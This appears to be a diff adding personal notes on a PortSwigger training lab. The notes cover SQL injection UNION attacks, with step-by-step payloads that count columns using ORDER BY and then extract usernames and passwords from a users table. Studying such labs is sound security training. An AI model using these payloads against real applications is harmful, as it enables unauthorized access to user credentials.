@@ -197,3 +197,24 @@ Alternative:
 	5b. category=Pets'+UNION+SELECT+NULL,'a',NULL--+
 		Response: Response
 ```
+
+
+###### Lab: SQL injection UNION attack, retrieving data from other tables
+URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+Endpoint: category
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Internal server error
+4.  Use UNION Payload
+	4a. category=Gifts' UNION SELECT NULL,NULL--
+	4b. category=Gifts' UNION SELECT username,password FROM users--
+```
